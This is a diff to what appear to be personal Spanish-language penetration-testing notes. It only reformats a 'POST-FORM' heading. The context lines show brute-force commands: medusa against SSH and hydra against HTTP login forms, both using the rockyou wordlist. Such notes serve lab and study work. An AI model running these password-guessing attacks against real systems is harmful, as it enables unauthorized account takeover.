@@ -62,7 +62,8 @@ Este sitio pretende recopilar mis notas acerca de cuestiones relevantes para rea
 
     medusa -u <USER> -P /usr/share/wordlist/rockyou.txt -h <IP_ADDRESS> -M 22
 
-----POST-FORM
+- POST-FORM
+
 hydra -l <username> -P <wordlist> 10.10.154.12 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 
 hydra -l <username> -P <path-to-short-rockyou> <remote-ip> http-post-form "/login:username=^USER^&password=^PASS^&Login=Login:Your username or password is incorrect." -V
